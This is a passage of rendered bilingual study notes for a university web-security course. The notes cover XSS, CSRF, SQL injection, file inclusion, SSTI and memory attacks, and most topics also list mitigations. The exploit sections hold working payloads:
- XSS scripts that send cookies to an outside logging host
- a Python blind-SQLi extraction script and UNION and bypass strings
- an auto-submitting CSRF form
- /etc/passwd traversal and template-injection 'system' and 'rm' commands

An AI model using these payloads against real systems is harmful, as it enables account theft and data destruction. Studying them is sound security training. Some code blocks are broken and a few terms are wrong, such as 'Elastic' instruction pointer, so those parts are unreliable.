+Execution (RCE) 远程执行代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#authorisation-vs-authentication"><span class="toc-number">1.8.</span> <span class="toc-text">Authorisation vs
+Authentication</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#serialisation-vs-deserialisation"><span class="toc-number">1.9.</span> <span class="toc-text">Serialisation vs
+Deserialisation</span></a></li></ol></li></ol></div> -->
+    <h1 id="comp90074-web-security-网络安全">COMP90074 Web Security
+网络安全</h1>
+<h2 id="基础">基础</h2>
+<h4 id="owasp-top-10-web-vulnerabilities-2017">OWASP Top 10 web
+vulnerabilities (2017)</h4>
+<ol type="1">
+<li>Injection</li>
+<li>Broken Authentication</li>
+<li>Sensitive Data Exposure</li>
+<li>XML External Entities (XEE)</li>
+<li>Broken Access Control</li>
+<li>Security Misconfiguration</li>
+<li>Cross-Site Scripting (XSS)</li>
+<li>Insecure Deserialization</li>
+<li>Using Component with Known Vulnerabilities</li>
+<li>Insufficient Logging &amp; Monitoring</li>
+</ol>
+<h4 id="terminology">Terminology</h4>
+<blockquote>
+<table>
+<colgroup>
+<col style="width: 48%" />
+<col style="width: 51%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Term</th>
+<th>Des</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Server 服务器</td>
+<td>-</td>
+</tr>
+<tr class="even">
+<td>Clinet 客户端</td>
+<td>-</td>
+</tr>
+<tr class="odd">
+<td>Connection 连接</td>
+<td>网络通信方式</td>
+</tr>
+<tr class="even">
+<td>Internet 因特网</td>
+<td>-</td>
+</tr>
+<tr class="odd">
+<td><strong>Network Interface Card 网络接口卡 (NIC)</strong></td>
+<td>硬件适配器, 连接网络为主机获取<u>Packets包</u></td>
+</tr>
+<tr class="even">
+<td><strong>Spoof 欺骗</strong></td>
+<td>伪装成其他人</td>
+</tr>
+<tr class="odd">
+<td><strong>Protocol 协议</strong></td>
+<td>软件必须遵守的<u>Set of Rules一系列规则</u></td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<h4 id="permission-权限">Permission 权限</h4>
+<blockquote>
+<p><em>道德</em>与不道德的主要区别就是是否依据 <strong>Vulnerability
+Disclosure Policy (VDP) 漏洞披露政策</strong></p>
+<blockquote>
+<p>问:
+是不是有<strong>VDP</strong>就代表被赋予了纰漏<strong>Promission权限</strong>？</p>
+</blockquote>
+<p>依照<strong>VDP</strong>进行的<u>漏洞批漏</u>才算是<em>道德的</em>,
+同时需要按照<strong>VPD</strong>给出的:</p>
+<ol type="1">
+<li><u>How</u>如何纰漏漏洞</li>
+<li><u>When</u>什么时间允许</li>
+<li><u>Scope</u>测试范围</li>
+</ol>
+<p><strong>VDP格式</strong></p>
+<ol type="1">
+<li>Guidelines 准则</li>
+<li>Host on the Company / Department’s website or resources</li>
+<li>Scope 允许测试范围</li>
+<li>Exclusions 不能测试的</li>
+<li>Expectations of handling 期望你如何做 (例如)</li>
+<li>A Way to Contact the organisation 组织联系方式</li>
+</ol>
+</blockquote>
+<h4 id="html-events">HTML Events</h4>
+<blockquote>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">element</span> <span class="attr">event</span>=<span class="string">&#x27;some JavaScript&#x27;</span>&gt;</span> <span class="comment">&lt;!--调用JS--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">on</span> <span class="attr">click</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>Alert!<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="comment">&lt;!--点击相应--&gt;</span></span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr class="header">
+<th>时间</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>onchange</code></td>
+<td>html element 被改变</td>
+</tr>
+<tr class="even">
+<td><code>onclick</code></td>
+<td>点击时间</td>
+</tr>
+<tr class="odd">
+<td><code>onmouseover</code></td>
+<td>鼠标悬停html element</td>
+</tr>
+<tr class="even">
+<td><code>onmouseout</code></td>
+<td>鼠标离开html element</td>
+</tr>
+<tr class="odd">
+<td><code>onkeydown</code></td>
+<td>按键盘</td>
+</tr>
+<tr class="even">
+<td><code>onload</code></td>
+<td>浏览器加载</td>
+</tr>
+<tr class="odd">
+<td><code>onerror</code></td>
+<td>错误: 例如图片无法加载</td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<h4 id="http-cookies-信息记录程序">HTTP Cookies 信息记录程序</h4>
+<blockquote>
+<ol type="1">
+<li><p>Tracking</p></li>
+<li><p>Authentication 鉴定</p>
+<ul>
+<li>identify whether user is logged in 识别用户是否已登录</li>
+</ul></li>
+<li><p>Security Measures</p>
+<ul>
+<li><table>
+<colgroup>
+<col style="width: 13%" />
+<col style="width: 86%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Attribute</th>
+<th>Definition</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>HTTPOnly</td>
+<td>JS cannot access it <br>unless the browser has vulnerabilities</td>
+</tr>
+<tr class="even">
+<td>Secure</td>
+<td>Must be send over SSL/TLS</td>
+</tr>
+<tr class="odd">
+<td>Expires</td>
+<td>用户端cookie被删除的时间</td>
+</tr>
+<tr class="even">
+<td>Domain</td>
+<td>域 domain is relates to, <br>e.g. ‘google.com’</td>
+</tr>
+<tr class="odd">
+<td>Path</td>
+<td>网站应用中的路径</td>
+</tr>
+</tbody>
+</table></li>
+</ul></li>
+</ol>
+<blockquote>
+<p>If the Expiry is not set, or is set to “Session”, the browser will
+remove the cookie upon closing
+如果<u>未设置</u>到期<u>或设置为"Session"</u>，<u>浏览器将在关闭时删除cookie</u>.</p>
+</blockquote>
+<blockquote>
+<p>Cookie Expiry
+必须在<strong>客户端</strong>和<strong>服务器端</strong>完成,
+<u>两端完成</u>。</p>
+</blockquote>
+<blockquote>
+<p>如果<strong>服务器</strong><u>未正确终止</u> Cookie，则具有 Cookie
+值的任何人都可以使用它作为您的用户进行身份验证。</p>
+</blockquote>
+</blockquote>
+<h4 id="domain-name-service-dns-域名服务系统">Domain Name Service (DNS)
+域名服务系统</h4>
+<blockquote>
+<p>DNS类似于一个电话黄页, 存储着域名对应的IP地址，
+DNS使用不排序的UDP包裹 <u>Unordered UDP packets</u>,
+并且是<u>不加密</u>的。</p>
+<p><strong>DNS Records Type</strong>:</p>
+<table>
+<thead>
+<tr class="header">
+<th>Type</th>
+<th>Des</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>A</td>
+<td>Address Record</td>
+</tr>
+<tr class="even">
+<td>AAAA</td>
+<td>IPv6 Address Record</td>
+</tr>
+<tr class="odd">
+<td>CNAME</td>
+<td>Canonical Record Name 规范名称记录</td>
+</tr>
+<tr class="even">
+<td>MX</td>
+<td>Mail Exchange Record 存储邮件交换</td>
+</tr>
+<tr class="odd">
+<td>TXT</td>
+<td>Text Record 存储文字</td>
+</tr>
+<tr class="even">
+<td>NS</td>
+<td>Name Server Record</td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<h4 id="asynchronous异步-javascript-and-xml-ajax">Asynchronous异步
+JavaScript And XML (AJAX)</h4>
+<blockquote>
+<ol type="1">
+<li>后台请求在<u>浏览器中运行</u></li>
+<li>使 Web应用程序更具<u>交互性</u></li>
+</ol>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/ZhidongZhou/gallery/master/img/iShot2022-03-03 15.18.01.png" alt="iShot2022-03-03 15.18.01" style="zoom:50%;" /></p>
+<h4 id="document-object-model-dom-文档对象模型">Document Object Model
+(DOM) 文档对象模型</h4>
+<blockquote>
+<p>parsing 解析 HTML 和 XML</p>
+<p>Object-oriented representation of web pages 网页的面向对象表示</p>
+<p>can be controoled by scripting languages like <em>JavaScript</em></p>
+</blockquote>
+<h2 id="xss-vs-csrf-vs-ssrf">XSS vs CSRF vs SSRF</h2>
+<table>
+<colgroup>
+<col style="width: 7%" />
+<col style="width: 30%" />
+<col style="width: 30%" />
+<col style="width: 30%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th></th>
+<th>XSS</th>
+<th>CSRf</th>
+<th>SSRF</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><strong>Definition</strong></td>
+<td>允许攻击者在受害用户的浏览器中执行任意 Javascript</td>
+<td>诱骗<u>用户</u>执行恶意请求<br>网站被攻击者控制<br>用户必须经过身份验证</td>
+<td><strong>服务端请求伪造</strong>:
+欺骗<u>服务器</u>代表攻击者执行未经授权的请求</td>
+</tr>
+<tr class="even">
+<td><strong>Mitigation</strong></td>
+<td>正则表达式或字符串筛选<br/>WAF<br/>HTML Encoding<br/>Content
+Security Policy</td>
+<td>具有高熵的 CSRF 令牌,
+绑定到用户的会话<br>Referrer<br><strong>CORS跨域资源共享</strong>:
+浏览器⽤于限制与其他⽹站交互的机制, 抵御恶意 AJAX
+请求,允许⽹站指定谁可以使⽤ AJAX</td>
+<td>将域名解析列⼊⽩名单<br/><br/>重新评估<strong>Egress
+Rule出⼝规则</strong><br/><br/>禁⽤未使⽤的 URL
+架构<br/><br/>将应⽤程序可访问的服务列⼊⽩名单（不允许使⽤ AWS
+元数据等敏感终端节点）</td>
+</tr>
+</tbody>
+</table>
+<h2 id="timing-attacks">Timing Attacks</h2>
+<blockquote>
+<p>定时攻击是受过教育的基于蛮⼒的攻击, 类似于SQLi</p>
+</blockquote>
+<h6 id="exploit">Exploit</h6>
+<ol type="1">
+<li>通过 <strong>brute-force 蛮力法</strong>破解密码</li>
+<li>使用 Burp-suite intercept 接获尝试登录密码的请求</li>
+<li>通过 Burp-suite intruder, 重放讲密码的第1位设置为变量</li>
+<li>然后导入 Character Set: <code>&#123;a-z, A-Z, 0-9&#125;</code></li>
+<li>根据从<u>Server 服务器</u>, <strong>Response Received
+收到回复</strong> 的时间判断哪一个 <strong>character 字符</strong>
+是正确的</li>
+<li>然后依次类推到第2位, 第三位。</li>
+</ol>
+<h2 id="xss">XSS</h2>
+<h6 id="impact">Impact</h6>
+<ol type="1">
+<li>Steal cookie</li>
+<li>Steal DOM</li>
+<li>Steal Local Storage</li>
+<li>操纵 AJAX 调用以执行未经授权的操作</li>
+</ol>
+<h6 id="remediation">Remediation</h6>
+<blockquote>
+<p>不要使用黑名单 Blacklist</p>
+</blockquote>
+<ol type="1">
+<li>Filter using regex</li>
+<li>WAF (不是防御机制, 而是额外的保护层)
+<ul>
+<li>通过过滤恶意行为来防范漏洞, 有助于防止难以修补的漏洞</li>
+</ul></li>
+<li>HTML 编码: 将信息从一个字符表示形式转换为另一个字符表示形式
+<ul>
+<li>URL</li>
+<li>HTML</li>
+<li>Base64</li>
+</ul></li>
+<li>Content Security Policy (CSP) 内容安全政策
+<ul>
+<li>服务器强制实施的安全机制</li>
+<li>浏览器使用服务器的规范进行编译</li>
+<li>声明已批准的内容来源</li>
+<li>用于不断缓解 XSS</li>
+</ul></li>
+<li>X-XSS 保护标头
+<ul>
+<li>由服务器强制执行</li>
+<li>浏览器试图遵守</li>
+<li>用于要求浏览器强制实施 XSS 审核员保护</li>
+<li>在沙盒中加载</li>
+<li>不再存在于 Chrome 和 Firefox 中。</li>
+</ul></li>
+</ol>
+<h4 id="stored-xss">Stored XSS</h4>
+<h6 id="exploit-1">Exploit</h6>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 1. Define Variable use XHR to connect browser with server.</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> XHR = <span class="keyword">new</span> XMLHttpRequest(); </span></span><br><span class="line"><span class="javascript">    <span class="comment">// 2. get cookie from the GET request</span></span></span><br><span class="line"><span class="javascript">    XHR.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://zhidongz.free.beeceptor.com/?cookie=&quot;</span> + <span class="built_in">document</span>.cookie, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 3.Send Request</span></span></span><br><span class="line"><span class="javascript">    XHR.send(); </span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> XHR_OUTTER = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    XHR_OUTTER.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (XHR_OUTTER.readyState == <span class="number">4</span> &amp;&amp; XHR_OUTTER.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> XHR_INNER = <span class="keyword">new</span> XMLHttpRequest()</span></span><br><span class="line"><span class="javascript">            XHR_INNER.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://zhidongz.free.beeceptor.com/?cookie=&quot;</span> + XHR_OUTTER.responseText, <span class="literal">true</span>)</span></span><br><span class="line"><span class="javascript">            XHR_INNER.send()</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    XHR_OUTTER.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;flag.php&quot;</span>, <span class="literal">true</span>)</span></span><br><span class="line"><span class="javascript">    XHR_OUTTER.send()</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="dom-based-xss">DOM-Based XSS</h4>
+<h6 id="exploit-2">Exploit</h6>
+<ol type="1">
+<li><code>&lt;script&gt;window.location.href="https://zhidongz.free.beeceptor.com?cookie="+document.domain;&lt;/script&gt;</code></li>
+<li><code>&lt;script&gt;window.location.href="&#123;target_url&#125;"&lt;/script&gt;</code></li>
+</ol>
+<h4 id="http-parameter-pollution-参数污染">HTTP Parameter Pollution
+参数污染</h4>
+<h6 id="定义">定义</h6>
+<blockquote>
+<p>导致应用程序误解提供的参数, 可以使用它绕过输入验证</p>
+</blockquote>
+<h4 id="tabnapping-浏览器分页绑架">Tabnapping 浏览器分页绑架</h4>
+<h6 id="定义-1">定义</h6>
+<blockquote>
+<p>在网络浏览器中绑架 Tab分页,
+允许攻击者打开关闭分页和更改标签页跳转的URL地址</p>
+</blockquote>
+<h6 id="exploit-3">Exploit</h6>
+<ol type="1">
+<li>找到: `<code>target="_blank_"</code> (过时的方法)</li>
+<li>打开: <code>window.opener.location.replace("&#123;URL&#125;")</code></li>
+<li>关闭: <code>window.opener.close()</code></li>
+</ol>
+<h6 id="impact-1">Impact</h6>
+<blockquote>
+<p>风险级别: 低</p>
+</blockquote>
+<h6 id="remediation-1">Remediation</h6>
+<ol type="1">
+<li>不要用: `<code>target="_blank_"</code></li>
+<li>使用: `rel="nofollow noopener noreferrer" target="_blank"</li>
+<li>或者: <code>target="_parent"</code></li>
+</ol>
+<h4 id="clickjacking-点击劫持">Clickjacking 点击劫持</h4>
+<blockquote>
+<p>将 UI 叠加在目标 Web 应用程序之上, 以便在未经授权的情况下执行操作</p>
+</blockquote>
+<h6 id="impact-2">Impact</h6>
+<blockquote>
+<p>非常具有欺骗性, 但影响不严重</p>
+</blockquote>
+<h4 id="subdomain-takeovers">Subdomain Takeovers</h4>
+<h2 id="sqli"><a
+target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">SQLi</a></h2>
+<h4 id="sql两种comment">SQL两种Comment</h4>
+<ol type="1">
+<li><code>--+</code></li>
+<li><code>#</code></li>
+</ol>
+<h4 id="sql-injection-union-attacks"><a
+target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL
+injection UNION attacks</a></h4>
+<h6 id="get-database-version">Get Database Version</h6>
+<p><code>UNION SELECT 1,2,@@VERSION--+</code></p>
+<h6 id="get-schema-name">GET Schema Name</h6>
+<ol type="1">
+<li><code>'UNION SELECT 1,2,schema()--+</code></li>
+<li><code>'UNION SELECT 1,2,database()--+</code></li>
+</ol>
+<h6 id="get-table-name">Get Table Name</h6>
+<p><code>'UNION SELECT 1,TABLE_NAME,2,3 FROM INFORMATION_SCHEMA.TABLES--+</code></p>
+<h6 id="get-string-value">Get String Value</h6>
+<p><code>' UNION SELECT 1,string,3,4 FROM Secure.Flag--+</code></p>
+<h6 id="retrieve-multiple-values-in-a-single-column">Retrieve Multiple
+Values in a Single Column</h6>
+<p><code>' UNION SELECT NULL, &#123;column_name_1&#125; ||'&#123;链接符&#125;'||&#123;column_name_2&#125; FROM &#123;table_name&#125; --</code></p>
+<h4 id="authentication-bypass-with-limit">Authentication Bypass with
+<code>LIMIT</code></h4>
+<h6 id="exploit-4">Exploit</h6>
+<ol type="1">
+<li>python:
+<ul>
+<li>```python payload = "SELECT * FROM {table_name} WHERE
+{column_name}='"+request.args['{column_name}']+"'AND
+{target_column_name}='" + request.args['{target_column_name}'] + "';"
+<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml">2. URL:</span></span><br><span class="line"><span class="xml">   - ```html</span></span><br><span class="line"><span class="xml">     https://</span><span class="template-variable">&#123;url&#125;</span><span class="xml">/</span><span class="template-variable">&#123;dynamic_url&#125;</span><span class="xml">?</span><span class="template-variable">&#123;param&#125;</span><span class="xml">=text&#x27; or 1=1 LIMIT 1-- &amp;password=password</span></span><br></pre></td></tr></table></figure></li>
+</ul></li>
+<li>SQLi:
+<ul>
+<li>```sql SELECT * FROM {table_name} WHERE
+{column_name}='{known_value}' or 1=1 LIMIT 1--' AND {target_column_name}
+= '{changed_value}'; <figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#### [Blind SQLi](https:<span class="comment">//portswigger.net/web-security/sql-injection/blind)</span></span><br><span class="line"></span><br><span class="line">&gt; [Cheat Sheet](https:<span class="comment">//portswigger.net/web-security/sql-injection/cheat-sheet)</span></span><br><span class="line"></span><br><span class="line">###### Exploit</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> Payload: `SELECT &#123;column_name&#125; FROM &#123;table_name&#125; WHERE &#123;column_name&#125; = <span class="string">&#x27;&#123;Password&#125;&#x27;</span> UNION SELECT <span class="number">1</span> <span class="keyword">from</span> users <span class="keyword">where</span> username = <span class="string">&#x27;administrator&#x27;</span> and <span class="keyword">if</span>(SUBSTRING(password,&#123;i&#125;,<span class="number">1</span>) = <span class="string">&#x27;&#123;char&#125;&#x27;</span>, sleep(<span class="number">3</span>), sleep(<span class="number">0</span>))--`</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> Python:</span><br><span class="line"></span><br><span class="line">   <span class="number">1.</span> ```python</span><br><span class="line">      <span class="keyword">import</span> requests</span><br><span class="line">      <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote # URL ENCODING</span><br><span class="line">      # AUTHENTICATION</span><br><span class="line">      session = requests.session()</span><br><span class="line">      url = <span class="string">&quot;http://&#123;domain_url&#125;/auth.php&quot;</span></span><br><span class="line">      credential = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;&#123;username&#125;&quot;</span>, <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;&#123;password&#125;&quot;</span>&#125;</span><br><span class="line">      # ESTABLISH CONNECTION </span><br><span class="line">      session.post(url, data=credential)</span><br><span class="line">      # CHARACTER SET</span><br><span class="line">      chars = <span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!\&quot;#()*+,-./:;&lt;=&gt;?@&#123;&#125;~[\]$%&amp;&#x27;^_`&quot;</span></span><br><span class="line">      target = []</span><br><span class="line">      for i <span class="keyword">in</span> range(&#123;range_str&#125;, &#123;range_end&#125;):</span><br><span class="line">          for char <span class="keyword">in</span> chars:</span><br><span class="line">              payload = f<span class="string">&quot;&#x27;UNION SELECT 1,2,3 FROM (SELECT GROUP_CONCAT(&#123;COLUMN_NAME&#125;) AS val FROM Secure.&#123;TABLE_NAME&#125; WHERE &#123;TARGET_COLUMN_NAME&#125; LIKE &#x27;%&#123;KNOWN_VALUE&#125;%&#x27;) AS tables WHERE BINARY SUBSTRING(val,&#123;i&#125;,1)=&#x27;&#123;char&#125;&#x27;;#&quot;</span></span><br><span class="line">              respond = session.get(<span class="string">&quot;http://&#123;domain_url&#125;/&#123;dynamic_url&#125;?&#123;param&#125;=&quot;</span>+quote(payload)) # URL ENCODING</span><br><span class="line">              <span class="keyword">if</span> respond.text == <span class="string">&#x27;true&#x27;</span>:</span><br><span class="line">                  target.append(char)</span><br><span class="line">                  print(<span class="string">&quot;Currnet: &quot;</span>, <span class="string">&quot;&quot;</span>.join(target))</span><br><span class="line">                  break</span><br><span class="line">      print(<span class="string">&quot;RESULT: &quot;</span>,<span class="string">&quot;&quot;</span>.join(target))</span><br></pre></td></tr></table></figure></li>
+</ul></li>
+</ol>
+<h6 id="mitigation">Mitigation</h6>
+<ol type="1">
+<li>Prepared Statements</li>
+<li>Stored Procedures</li>
+<li>White List Input Validation</li>
+<li>Escaping User Input</li>
+<li>WAF</li>
+<li>Blacklisting Input</li>
+</ol>
+<h4 id="sql-wildcard-attack">SQL Wildcard Attack</h4>
+<h6 id="exploit-5">Exploit</h6>
+<ol type="1">
+<li>用 <strong>下划线 <code>_</code></strong> 或者
+<strong>百分号<code>%</code></strong></li>
+<li>或者<strong>双百分号</strong>:
+<code>SELECT &#123;column_name&#125; FROM &#123;table_name&#125; WHERE &#123;column_name&#125; = '%%'</code></li>
+<li>注意注入语句(Payload), 需要预先通过URL Encoding:
+<code>%25</code></li>
+</ol>
+<h2 id="cross-site-request-forgery-跨站点请求伪造-csrf">Cross-Site
+Request Forgery 跨站点请求伪造 (CSRF)</h2>
+<h6 id="mitigation-1">Mitigation</h6>
+<ol type="1">
+<li><strong>CSRF令牌</strong>:不可预测的高熵,
+与一般的会话令牌一样。绑定到用户的会话 在执行相关操作之前,
+在每种情况下都经过严格验证。动态每次加载任何页面无法预测。</li>
+<li><strong>Referrers 推荐人</strong>: 除 CSRF 令牌外,
+仅将特定推荐人列入白名单</li>
+<li>CORS 设置: 仅允许受信任的源！
+<ul>
+<li>不要做: <code>Access-Control-Allow-Origin: *</code></li>
+</ul></li>
+</ol>
+<h6 id="exploit-6">Exploit</h6>
+<ol type="1">
+<li><p>首先Burp-suite intercept 截获修改email的请求, 得到:
+<code>CSRF</code></p></li>
+<li><p>用获取的<code>CSRF</code>, 冲洗发送HTML请求</p>
+<ol type="1">
+<li>```html
+<html>
+<body>
+<form action="{url}" method="POST" id="form1">
+<input type="hidden" name="email" value="{url_encoded_new_email}"/>
+<input type="hidden" name="csrf" value="ZX8jzwyJaLCgHSvUb7YRiNMZA22l7q9J"/>
+<input type="submit" value="Submit request"/>
+</form>
+</body>
+<script>
+    document.getElementById("form1").submit()
+  </script>
+</html>
+<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## LDAP Injection</span><br><span class="line"></span><br><span class="line">###### 定义</span><br><span class="line"></span><br><span class="line">&gt; 轻量级目录访问协议, 与 SQLi 非常相似, 操作 LDAP 查询以执行所需操作</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Local File Inclusion 本地⽂件包含 (LFI)</span><br><span class="line"></span><br><span class="line">#### Directory Traversal Attack 目录遍历攻击</span><br><span class="line"></span><br><span class="line">###### Exploit</span><br><span class="line"></span><br><span class="line">`/../../etc/passwd`</span><br><span class="line"></span><br><span class="line">#### PHP Protocol</span><br><span class="line"></span><br><span class="line">###### Exploit</span><br><span class="line"></span><br><span class="line">`/&#123;dynamic_url&#125;?&#123;params&#125;=php:<span class="comment">//filter/read=convert.base64-encode/resource=&#123;target php file&#125;`</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Remote File Inclusion 远程⽂件包含(RFI)</span><br><span class="line"></span><br><span class="line">###### 定义</span><br><span class="line"></span><br><span class="line">&gt; 与 LFl 相同, 导致相同的漏洞, 使用相同的协议, 但现在可远程获取</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Filter Bypasses</span><br><span class="line"></span><br><span class="line">###### 定义</span><br><span class="line"></span><br><span class="line">&gt; 过滤器可以使用正则表达式或任何类型的字符串匹配</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Code Injection</span><br><span class="line"></span><br><span class="line">###### 定义</span><br><span class="line"></span><br><span class="line">&gt; 这种攻击可能是盲目的, 永远记得尝试引入时间延迟（睡眠）或外部服务器交互</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## log injection ⽇志注⼊</span><br><span class="line"></span><br><span class="line">###### Mitigation</span><br><span class="line"></span><br><span class="line">不要向用户公开日志。他们不应该看到他们。在将用户输入存储在日志中之前, 请先对其进行清理。不允许用户控制日志的路径/文件名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## OS Command Injection 操作系统命令注⼊</span><br><span class="line"></span><br><span class="line">###### 定义</span><br><span class="line"></span><br><span class="line">&gt; 没有正确清理用户输入。将操作系统命令注入为用户输入</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###### Mitigation</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 针对允许值的白名单进行验证。</span><br><span class="line"><span class="number">2.</span> 验证输入是否为数字（如果输入是预期的数字）。</span><br><span class="line"><span class="number">3.</span> 验证输入是否仅包含字母数字字符, 而不包含其他字符语法或空格。</span><br><span class="line"><span class="number">4.</span> 不允许用户输入到达操作系统命令！你是在找麻烦, 重新架构该软件要避免这种情况！</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Buffer Overflow</span><br><span class="line"></span><br><span class="line">#### Low-level memory 低级内存</span><br><span class="line"></span><br><span class="line">- CPU架构</span><br><span class="line">  - 包含 CPU 注册器</span><br><span class="line">  - <span class="number">16</span> 个通用寄存器, 用于 <span class="number">64</span> 位 （x86<span class="number">-64</span>）</span><br><span class="line">  - <span class="number">8</span> 个通用寄存器, 用于 <span class="number">32</span> 位（x86）</span><br><span class="line">  - Cache Stores 缓存: 将信息存储一定时间</span><br><span class="line">    - 随着金字塔的下行, 存储变得越来越便宜和缓慢。</span><br><span class="line">  - Elastic Instruction Pointer (EIP): 弹性指令指针</span><br><span class="line">  - Elastic Base Pointer (EBP): 弹性基础指针</span><br><span class="line">  - Elastic Stack Pointer (ESP): 弹性堆栈指针</span><br><span class="line">  - Endianness: 字节序</span><br><span class="line"></span><br><span class="line">###### 定义</span><br><span class="line"></span><br><span class="line">&gt; 过度填充缓冲区, 直到覆盖内存位置, 从而导致应用程序流发生更改。通常, 我们尝试接管ERIP, 因为它使我们能够控制程序执行流。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Format string attack</span><br><span class="line"></span><br><span class="line">###### 定义</span><br><span class="line"></span><br><span class="line">&gt; 利用语言提供的打印命令, 使开发人员更容易打印, 允许开发人员指定变量的数据类型和位置, 在打印字符串中,开发人员可以使用它来打印字符串、整数、内存位置等。</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">###### Impact</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> DOS 泛红攻击</span><br><span class="line"><span class="number">2.</span> Information leakage</span><br><span class="line"></span><br><span class="line">###### Mitigation</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 切勿让用户控制能够设置格式的打印语句</span><br><span class="line"><span class="number">2.</span> 如果可以, 则默认为 `%s`</span><br><span class="line"><span class="number">3.</span> **清理 Sanitise** 用户输入: `%`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## [Server-Side Template Injection (SSIT)](https:<span class="comment">//portswigger.net/web-security/server-side-template-injection) 服务器端模板注⼊</span></span><br><span class="line"></span><br><span class="line">###### Template engine: `Jinja2`</span><br><span class="line"></span><br><span class="line">###### Exploit</span><br><span class="line"></span><br><span class="line">&gt; 需要 URL Encoding</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 运算:  `&#123;dynamic_url&#125;?&#123;param&#125;=&lt;%= <span class="number">7</span>*<span class="number">7</span> %&gt;`</span><br><span class="line"><span class="number">2.</span> 系统命令: `&#123;dynamic_url&#125;?&#123;param&#125;=&lt;%= <span class="keyword">system</span>(<span class="string">&#x27;id&#x27;</span>) %&gt;`</span><br><span class="line"><span class="number">3.</span> 删除: `&lt;%= <span class="keyword">system</span>(<span class="string">&#x27;rm &#123;target_file&#125;&#x27;</span>) %&gt;`</span><br><span class="line"></span><br><span class="line">&gt; 并且不同Framwork有不同的语法:</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> [TOMADO](https:<span class="comment">//portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)</span></span><br><span class="line"></span><br><span class="line">   <span class="number">1.</span> 执行任意 Python: `&#123;% somePython %&#125;`</span><br><span class="line">   <span class="number">2.</span> 删除: `&#123;%<span class="keyword">import</span> os%&#125;&#123;&#123;os.<span class="keyword">system</span>(<span class="string">&#x27;rm /home/carlos/morale.txt&#x27;</span>)`</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> Django</span><br><span class="line"></span><br><span class="line">   <span class="number">1.</span> `&#123;% debug %&#125;`</span><br><span class="line">   <span class="number">2.</span> 